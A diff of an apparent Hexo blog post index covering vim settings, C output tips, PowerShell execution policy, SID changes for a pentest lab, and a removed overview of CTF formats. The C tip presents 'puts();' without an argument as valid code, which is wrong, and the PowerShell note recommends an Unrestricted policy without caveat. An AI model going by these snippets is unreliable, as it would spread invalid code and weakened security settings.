@@ -13,32 +13,27 @@
       </tags>
   </entry>
   <entry>
-    <title>云服务器</title>
-    <url>/2024/09/10/%E5%A4%87%E5%BF%98%E5%BD%95/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
-    <content><![CDATA[
-<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="01623beed1f3152631c2404190b6f38ec45e5209015973c8234b812b3f302185">2c57a2851a68e9855f8788f6d6316468534e195ad74e87259f53b0c03bb99be47473a3f5f9e5e77c7fc153886505447ef95ba1bd306fe121bb7af72b2f151fe82083b308afa6edd9ad5ce1d9c755cfd176b9064c7f303d86dc65ef12eedeb23bcb2a5c88fe2baba53a67b1b7830cd243cd18dc10d2d19e3553e1ebee2a7aa63ec06a33ce56c2811fa97ec915d8b0228a04990e87e2b4e8504cbf1c1bb8a6056b1277c13a5515a0af51883ca0c09eae27608a5d5f7f1dbe54f8b358bc3720979fc1abc8e61f8e2b4061360ba191fe2abec8a119b1c51725c73c1a7817a3edbafe0a7f7fd2a23022cc11f79b0fc2fc430169b83ad498b6d47792c7edff4ad6eb52d680e5d318e91c91a754e71599631657f7c9e7d4b54d77b73a2ef3050e9df98a92068c863bebdd9de0c29b7b38cb6ddd72487e4081d782805d309c91e81466664a1d0c923ee6bb8bcabf8545dd8fda13de0fea1236d90ef8f80267f1fa8ca8ef953caec07faf4f1056bd1804b4c8aa1ccdc9c06980a0ccfa22ef6970211a9d56ed63dec6c95de3a9cf03eb83853b819a4060d8e92f9e3fd36840fd8e3ede22cd35a8800d4a38dcb81045f98c7b59f6e47d39f90754a887dc5b70f017382ff6040ab63a3a5663adb87ba6975176daa18251a8471bab979a737fa8517d3889f7b2af9d65c25b160056d99ec0728b3e4c742ae8c411f78a063f7a84bce14b4633141780db71813538e437ce3e16ecbe51375844ae6c9570b7516cf140904255c53a65fe7fb5c562a9b656038ead2c584e931e9cfb0b8abd01fbede4d66a441cc6f638a87ccbb4652ee8bd645402a0ab1c0214461bd3a306241f3ed0916af121f5e3</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<link href="/css/hbe.style.css" rel="stylesheet" type="text/css"><script data-swup-reload-script type="module" src="/js/plugins/hbe.js"></script>
-<script data-swup-reload-script type="module">
-import {initHBE} from "/js/plugins/hbe.js";
-  console.log("hexo-blog-encrypt: loaded.");
-    initHBE();
-</script>
+    <title>Hello World</title>
+    <url>/2024/09/09/example/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 ]]></content>
       <categories>
-        <category>备忘录</category>
+        <category>example</category>
       </categories>
       <tags>
-        <tag>备忘录</tag>
+        <tag>example</tag>
       </tags>
   </entry>
   <entry>
@@ -71,30 +66,6 @@ import {initHBE} from "/js/plugins/hbe.js";
       </tags>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/2024/09/09/example/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-]]></content>
-      <categories>
-        <category>example</category>
-      </categories>
-      <tags>
-        <tag>example</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>测试文章时效性</title>
     <url>/2024/09/09/example/%E6%B5%8B%E8%AF%95%E6%97%B6%E6%95%88%E6%80%A7/</url>
     <content><![CDATA[<h1 id="这是测试文字"><a href="#这是测试文字" class="headerlink" title="这是测试文字"></a>这是测试文字</h1><h2 id="这是测试文字-1"><a href="#这是测试文字-1" class="headerlink" title="这是测试文字"></a>这是测试文字</h2><h3 id="这是测试文字-2"><a href="#这是测试文字-2" class="headerlink" title="这是测试文字"></a>这是测试文字</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">这是测试文字</span><br></pre></td></tr></table></figure></div>
@@ -106,6 +77,127 @@ import {initHBE} from "/js/plugins/hbe.js";
       </categories>
       <tags>
         <tag>example</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux系统Tab键相关设置</title>
+    <url>/2024/09/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/centos-linux/Tab%E9%94%AE%E8%AE%BE%E7%BD%AE/</url>
+    <content><![CDATA[<h3 id="Tab键相关设置"><a href="#Tab键相关设置" class="headerlink" title="Tab键相关设置"></a>Tab键相关设置</h3><h4 id="修改Tab键一次为4个空格"><a href="#修改Tab键一次为4个空格" class="headerlink" title="修改Tab键一次为4个空格"></a>修改Tab键一次为4个空格</h4><h5 id="1-仅本次"><a href="#1-仅本次" class="headerlink" title="1.仅本次"></a>1.仅本次</h5><p><strong>只在本次开打vim编辑器时生效，若重新打开vim编辑器，则失效</strong></p>
+<p>进入末行模式（ESC）<br>输入指令：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> tabstop=4</span><br></pre></td></tr></table></figure></div>
+
+<h5 id="2-永久"><a href="#2-永久" class="headerlink" title="2.永久"></a>2.永久</h5><p><strong>要想每次打开vim编辑器都能生效</strong>，可以编辑 Vim 的配置文件 .vimrc，并添加配置来设置 Tab 键的宽度</p>
+<p>打开.vimrc文件,若没有就手动创建一个即可</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.vimrc</span><br><span class="line"><span class="comment">#输入以下配置</span></span><br><span class="line"><span class="built_in">set</span> tabstop=4</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="修改vim编辑器可查看文件行数"><a href="#修改vim编辑器可查看文件行数" class="headerlink" title="修改vim编辑器可查看文件行数"></a>修改vim编辑器可查看文件行数</h4><p>打开.vimrc文件,若没有就手动创建一个即可</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.vimrc</span><br><span class="line"><span class="comment">#输入以下配置</span></span><br><span class="line"><span class="built_in">set</span> nu</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="使vim打开文件可自动缩进"><a href="#使vim打开文件可自动缩进" class="headerlink" title="使vim打开文件可自动缩进"></a>使vim打开文件可自动缩进</h4><p>打开.vimrc文件,若没有就手动创建一个即可</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> shiftwidth=4    <span class="comment">#缩进使用4个空格的宽度</span></span><br><span class="line"><span class="built_in">set</span> softtabstop=4   <span class="comment">#设置tab所占的列数，当输入tab时，设为4个空格的宽度</span></span><br><span class="line"><span class="built_in">set</span> expandtab       <span class="comment">#扩展tab为空格</span></span><br><span class="line"><span class="built_in">set</span> autoindent		<span class="comment">#设置自动缩进</span></span><br><span class="line"><span class="built_in">set</span> smartindent		<span class="comment">#设置智能缩进</span></span><br></pre></td></tr></table></figure></div>
+
+<h4 id="vim暂时关闭缩进和注释自动缩进设置"><a href="#vim暂时关闭缩进和注释自动缩进设置" class="headerlink" title="vim暂时关闭缩进和注释自动缩进设置"></a>vim暂时关闭缩进和注释自动缩进设置</h4><p>VIM在粘贴代码时会自动缩进，把代码搞得一团糟糕，甚至可能因为某行的一个注释造成后面的代码全部被注释掉</p>
+<h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> pastetoggle</span><br></pre></td></tr></table></figure></div>
+
+<p>即可关闭自动缩进</p>
+<p>或者设置为快捷键，最方便的方法就是在.vimrc中加一句：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> pastetoggle=</span><br></pre></td></tr></table></figure></div>
+
+<p>以后在插入模式下，只要按<strong>F9</strong>键就可以切换自动缩进。</p>
+<p>当需要自己手写代码的时候，进入<strong>insert模式</strong>，默认就是自动缩进了。</p>
+<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="built_in">paste</span></span><br></pre></td></tr></table></figure></div>
+
+<p>然后再进入插入模式粘贴，代码就不会被自动缩进。</p>
+<p>敲代码的时候需要自动缩进，需要改回来:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> nopaste</span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+      <categories>
+        <category>操作系统</category>
+        <category>linux(centos)</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>云服务器</title>
+    <url>/2024/09/10/%E5%A4%87%E5%BF%98%E5%BD%95/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
+    <content><![CDATA[
+<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="01623beed1f3152631c2404190b6f38ec45e5209015973c8234b812b3f302185">2c57a2851a68e9855f8788f6d6316468534e195ad74e87259f53b0c03bb99be47473a3f5f9e5e77c7fc153886505447ef95ba1bd306fe121bb7af72b2f151fe82083b308afa6edd9ad5ce1d9c755cfd176b9064c7f303d86dc65ef12eedeb23bcb2a5c88fe2baba53a67b1b7830cd243cd18dc10d2d19e3553e1ebee2a7aa63ec06a33ce56c2811fa97ec915d8b0228a04990e87e2b4e8504cbf1c1bb8a6056b1277c13a5515a0af51883ca0c09eae27608a5d5f7f1dbe54f8b358bc3720979fc1abc8e61f8e2b4061360ba191fe2abec8a119b1c51725c73c1a7817a3edbafe0a7f7fd2a23022cc11f79b0fc2fc430169b83ad498b6d47792c7edff4ad6eb52d680e5d318e91c91a754e71599631657f7c9e7d4b54d77b73a2ef3050e9df98a92068c863bebdd9de0c29b7b38cb6ddd72487e4081d782805d309c91e81466664a1d0c923ee6bb8bcabf8545dd8fda13de0fea1236d90ef8f80267f1fa8ca8ef953caec07faf4f1056bd1804b4c8aa1ccdc9c06980a0ccfa22ef6970211a9d56ed63dec6c95de3a9cf03eb83853b819a4060d8e92f9e3fd36840fd8e3ede22cd35a8800d4a38dcb81045f98c7b59f6e47d39f90754a887dc5b70f017382ff6040ab63a3a5663adb87ba6975176daa18251a8471bab979a737fa8517d3889f7b2af9d65c25b160056d99ec0728b3e4c742ae8c411f78a063f7a84bce14b4633141780db71813538e437ce3e16ecbe51375844ae6c9570b7516cf140904255c53a65fe7fb5c562a9b656038ead2c584e931e9cfb0b8abd01fbede4d66a441cc6f638a87ccbb4652ee8bd645402a0ab1c0214461bd3a306241f3ed0916af121f5e3</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
+      </label>
+    </div>
+  </div>
+</div>
+<link href="/css/hbe.style.css" rel="stylesheet" type="text/css"><script data-swup-reload-script type="module" src="/js/plugins/hbe.js"></script>
+<script data-swup-reload-script type="module">
+import {initHBE} from "/js/plugins/hbe.js";
+  console.log("hexo-blog-encrypt: loaded.");
+    initHBE();
+</script>
+]]></content>
+      <categories>
+        <category>备忘录</category>
+      </categories>
+      <tags>
+        <tag>备忘录</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>C语言的一些代码小技巧</title>
+    <url>/2024/09/11/C%E8%AF%AD%E8%A8%80/%E5%9F%BA%E7%A1%80%E9%83%A8%E5%88%86/%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
+    <content><![CDATA[<h1 id="C语言中的代码小技巧"><a href="#C语言中的代码小技巧" class="headerlink" title="C语言中的代码小技巧"></a>C语言中的代码小技巧</h1><h2 id="1、输出一个回车符号"><a href="#1、输出一个回车符号" class="headerlink" title="1、输出一个回车符号"></a>1、输出一个回车符号</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);	<span class="comment">//表示输出一个回车符号</span></span><br></pre></td></tr></table></figure></div>
+
+<p>putchar()函数表示直接输出一个字符，（）内可以填写一个字符；也可以填写其ASCII码（一个整数），然后系统将其转化为字符输出</p>
+<p>而ASCII中的10对应的是line feed(换行)，所以改语句才实现了换行功能</p>
+<p>当然也可以直接</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>或者</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>();</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>解释</p>
+</blockquote>
+<p>putchar();输出的是字符，但不自带换行功能。</p>
+<p>puts();自带换行功能，将结尾\0换成\n。</p>
+<hr>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
+      <categories>
+        <category>C语言</category>
+        <category>基础部分</category>
+      </categories>
+      <tags>
+        <tag>C语言</tag>
+        <tag>技巧</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>windows系统powershell脚本运行策略</title>
+    <url>/2024/09/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/windows/powershell%E8%BF%90%E8%A1%8C%E7%AD%96%E7%95%A5/</url>
+    <content><![CDATA[<h2 id="powershell脚本运行策略"><a href="#powershell脚本运行策略" class="headerlink" title="powershell脚本运行策略"></a>powershell脚本运行策略</h2><p><strong>Powershell一般初始化情况下都会禁止脚本执行。脚本能否执行取决于Powershell的执行策略</strong></p>
+<h3 id="查看权限"><a href="#查看权限" class="headerlink" title="查看权限"></a>查看权限</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-ExecutionPolicy </span><br></pre></td></tr></table></figure></div>
+
+<p><strong>Unrestricted</strong>:权限最高，可以不受限制执行任何脚本</p>
+<p>Default:为Powershell默认的策略</p>
+<p>Restricted，不允许任何脚本执行</p>
+<p>AllSigned：所有脚本都必须经过签名才能在运行</p>
+<p>RemoteSigned：本地脚本无限制，但是对来自网络的脚本必须经过签名</p>
+<h3 id="改变运行策略"><a href="#改变运行策略" class="headerlink" title="改变运行策略"></a>改变运行策略</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ExecutionPolicy Unrestricted</span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+      <categories>
+        <category>操作系统</category>
+        <category>windows</category>
+      </categories>
+      <tags>
+        <tag>windows</tag>
       </tags>
   </entry>
   <entry>
@@ -368,213 +460,155 @@ import {initHBE} from "/js/plugins/hbe.js";
       </tags>
   </entry>
   <entry>
-    <title>C语言的一些代码小技巧</title>
-    <url>/2024/09/11/C%E8%AF%AD%E8%A8%80/%E5%9F%BA%E7%A1%80%E9%83%A8%E5%88%86/%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
-    <content><![CDATA[<h1 id="C语言中的代码小技巧"><a href="#C语言中的代码小技巧" class="headerlink" title="C语言中的代码小技巧"></a>C语言中的代码小技巧</h1><h2 id="1、输出一个回车符号"><a href="#1、输出一个回车符号" class="headerlink" title="1、输出一个回车符号"></a>1、输出一个回车符号</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);	<span class="comment">//表示输出一个回车符号</span></span><br></pre></td></tr></table></figure></div>
-
-<p>putchar()函数表示直接输出一个字符，（）内可以填写一个字符；也可以填写其ASCII码（一个整数），然后系统将其转化为字符输出</p>
-<p>而ASCII中的10对应的是line feed(换行)，所以改语句才实现了换行功能</p>
-<p>当然也可以直接</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br></pre></td></tr></table></figure></div>
-
-<p>或者</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>();</span><br></pre></td></tr></table></figure></div>
-
+    <title>windows系统修改系统SID</title>
+    <url>/2024/09/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/windows/%E4%BF%AE%E6%94%B9SID/</url>
+    <content><![CDATA[<h1 id="修改SID"><a href="#修改SID" class="headerlink" title="修改SID"></a>修改SID</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>修改SID一般用在windows server机器上，做内网渗透搭建域环境时需要的，因为域环境不能有SID相同的机器</p>
 <blockquote>
-<p>解释</p>
+<p><strong>注意：用sysprep修改SID之后，系统会自动重启，之前配置好的网络、修改过的机器名会重置。所以，该操作需要在配置网络、修改机器名之前进行操作。</strong></p>
 </blockquote>
-<p>putchar();输出的是字符，但不自带换行功能。</p>
-<p>puts();自带换行功能，将结尾\0换成\n。</p>
-<hr>
-<h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
-      <categories>
-        <category>C语言</category>
-        <category>基础部分</category>
-      </categories>
-      <tags>
-        <tag>C语言</tag>
-        <tag>技巧</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTF竞赛模式</title>
-    <url>/2024/09/12/ctf/data/%E7%AB%9E%E8%B5%9B%E6%A8%A1%E5%BC%8F/</url>
-    <content><![CDATA[<h1 id="竞赛模式"><a href="#竞赛模式" class="headerlink" title="竞赛模式"></a>竞赛模式</h1><p>CTF竞赛模式具体分为以下几类：</p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="理论知识"><a href="#理论知识" class="headerlink" title="理论知识"></a>理论知识</h3><p>理论题多见于国内比赛，通常为选择题。包含单选及多选，选手需要根据自己所学的相关理论知识进行作答。最终得出分数。理论部分通常多见于初赛或是初赛之前的海选</p>
-<h3 id="Jeopardy-解题"><a href="#Jeopardy-解题" class="headerlink" title="Jeopardy-解题"></a>Jeopardy-解题</h3><p>参赛队伍可以通过互联网或者现场网络参与，参数队伍通过与在线环境交互或文件离线分析，解决网络安全技术挑战获取相应分值，类似于 ACM 编程竞赛、信息学奥林匹克赛，根据总分和时间来进行排名。</p>
-<p>不同的是这个解题模式一般会设置 一血(First Blood) 、 二血(Second Blood) 、 三血(Third Blood) ，也即最先完成的前三支队伍会获得额外分值，所以这不仅是对首先解出题目的队伍的分值鼓励，也是一种团队能力的间接体现。</p>
-<p>当然还有一种流行的计分规则是设置每道题目的初始分数后，根据该题的成功解答队伍数，来逐渐降低该题的分值，也就是说如果解答这道题的人数越多，那么这道题的分值就越低。最后会下降到一个保底分值后便不再下降。一般称之为<code>动态积分</code></p>
-<p>题目类型主要包含 Web 网络攻防 、 RE 逆向工程 、 Pwn 二进制漏洞利用 、 Crypto 密码攻击以及 Misc 安全杂项 这五个类别，个别比赛会根据题目类型进行扩展。</p>
-<h3 id="AwD-攻防模式"><a href="#AwD-攻防模式" class="headerlink" title="AwD-攻防模式"></a>AwD-攻防模式</h3><p><strong>A</strong>ttack <strong>w</strong>ith <strong>D</strong>efense(AwD)全称攻防模式，在攻防模式CTF赛制中，参赛队伍连接到同一个网络空间。主办方会预先为每个参赛队分配要防守的主机，该主机称之为<code>GameBox</code>，每个队伍之间的GameBox<code>配置及漏洞是完全一致</code>的，选手需要防护自己的GameBox不被攻击的同时挖掘漏洞并攻击对手服务来得分。在AwD中主办方会运行一个名为<code>Checker</code>的程序定时检测选手的GameBox的运行状态。若检测到状态不对则判定该GameBox宕机，按照规则扣除一定分数。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续24至48小时左右），同时也比团队之间的分工配合与合作。</p>
-<p>AwD通常仅包含<code>Web</code>及<code>Pwn</code>两种类型的题目。每个队伍可能会分到多个GameBox，随着比赛的进行，最早的GameBox可能会下线，同时会上线新的GameBox。</p>
-<h3 id="ADP-攻防增强"><a href="#ADP-攻防增强" class="headerlink" title="ADP-攻防增强"></a>ADP-攻防增强</h3><p><strong>A</strong>ttack <strong>D</strong>efense <strong>P</strong>lus(ADP)全称攻防增强模式，在该模式下中，参赛队伍连接到同一个网络空间。主办方会在平台上放置题目，选手需要登录到平台获得题目信息</p>
-<p>攻击模式下，平台会给出题目的访问链接，选手按照解题模式做题提交flag即可完成攻击，当完成攻击后， 每轮计算分数时均会计算该题目的攻击得分。</p>
-<p>防御模式下，选手需要自行挖掘题目的漏洞，并制作漏洞补丁包上传至平台，之后点击验证。验证时平台会新建一个完全干净的题目环境，使用预置的Exploit进行攻击，若攻击成功当验证通过之后（即已经完成修补），每轮计算分数均会认为该题目已防御。</p>
-<p>也就是说，对于每个题目，仅需要攻击成功一次，防御成功一次，该题就可以认为已完成，后续无需进行关注。</p>
-<p>ADP通常仅包含<code>Web</code>及<code>Pwn</code>两种类型的题目。随着比赛的进行，最早的题目可能会下线，后续也有可能会上线新的题目。</p>
-<p>ADP相较于AwD来说，选手无须编写批量攻击脚本，也无需关注题目的环境是否被攻击，是否服务异常等等，要做的只是攻击一次，防御一次，选手可以有更多的时间聚焦于还未完成的题目。从主办方的角度来说，大大减轻了比赛的硬件成本和运维成本。</p>
-<h3 id="RHG-自动化-AI自动化"><a href="#RHG-自动化-AI自动化" class="headerlink" title="RHG-自动化[AI自动化]"></a>RHG-自动化[AI自动化]</h3><p><strong>R</strong>obo <strong>H</strong>acking <strong>G</strong>ame(RHG)该利用人工智能或是AI或是自动化攻击程序来全自动的挖掘并利用漏洞，考验选手对于<code>漏洞理解</code>以及<code>工程化</code>能力。比赛开始前(一般为1-4周左右)主办方会给出测试环境以及相关接口文档。选手需要编写自动化程序来请求接口获取题目相关信息，该类程序通常称之为<code>bot</code>，在程序中<code>全自动</code>访问并挖掘目标漏洞，完成利用漏洞攻击并获取flag的过程。获取到的flag也由程序自动化提交。RHG因为是由bot全自动进行工作，所以比赛开始即可视为结束。剩下的一切全看参赛选手编写的自动化bot的工作情况。</p>
-<p>比赛过程中不允许选手对bot进行任何的操作(包括debug&#x2F;patch等等)。选手仅能看到自己的bot完成了哪些题。目前的得分情况等等。</p>
-<h3 id="RW-真实世界"><a href="#RW-真实世界" class="headerlink" title="RW-真实世界"></a>RW-真实世界</h3><p><strong>R</strong>eal <strong>W</strong>orld(RW) 首次于2018年<code>长亭科技</code>主办的RealWorldCTF中出现，该赛制着重考察选手在面对真实的环境下的漏洞挖掘与利用能力。通常RW模式出题也会围绕着能够应用于真实渗透攻击当中的漏洞，一般来说RW常见题型为VM&#x2F;Docker逃逸、针对浏览器的攻击、针对IoT&#x2F;Car等设备的攻击，Web类攻击等等<br>在RW赛制中会有一个<code>Show Time</code>，当选手认为自己已经可以完成题目时，选手可以在比赛平台上提交展示申请，由工作人员根据申请先后顺序进行展示排期。选手展示之前需要上台并连接相关网络，同时现场大屏会切换至目标的正常页面。选手确认连接并测试OK之后开始计时。一般情况下上台攻击的时间为<code>5分钟</code>，选手一旦完成攻击现场大屏幕会实时看到攻击的效果，此时裁判会根据效果是否符合题目要求来判定该题是否完成。如未在攻击时间内依然未能看到展示效果则认为本次攻击失败。现如今为了防止选手恶意排期。通常会有一个队伍总展示次数(例如在2019年数字经济云安全公测大赛中每个队伍只允许上台展示30次)，选手也需要尽可能保证上台之后攻击的成功率</p>
-<p>举个例子。题目要求需要攻击位于比赛网络中的某个网站并将首页替换为包含队伍名称的页面。题目给出该网站的一些信息(源代码&#x2F;数据库等等)，选手经过本地挖掘漏洞之后，提交展示申请，排期到了之后进行上台展示。注意，因为RW模式是以展示效果来作为题目是否完成的准则，所以在RW模式中并<code>不存在Flag</code>。</p>
